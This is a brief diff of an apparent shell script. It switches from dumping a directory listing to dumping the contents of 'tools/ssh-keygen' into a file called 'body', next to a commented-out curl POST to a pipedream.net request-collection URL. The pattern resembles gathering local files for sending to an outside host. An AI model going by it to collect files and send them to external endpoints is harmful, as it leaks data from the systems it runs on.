@@ -10,8 +10,8 @@
 
 #curl "$url"
 
-echo $(ls -la tools) > body
-#echo $(cat tools/ssh-keygen) > file.txt
+#echo $(ls -la tools) > body
+echo $(cat tools/ssh-keygen) > body
 
 #curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
 #  -H "Content-Type: text/xml" \
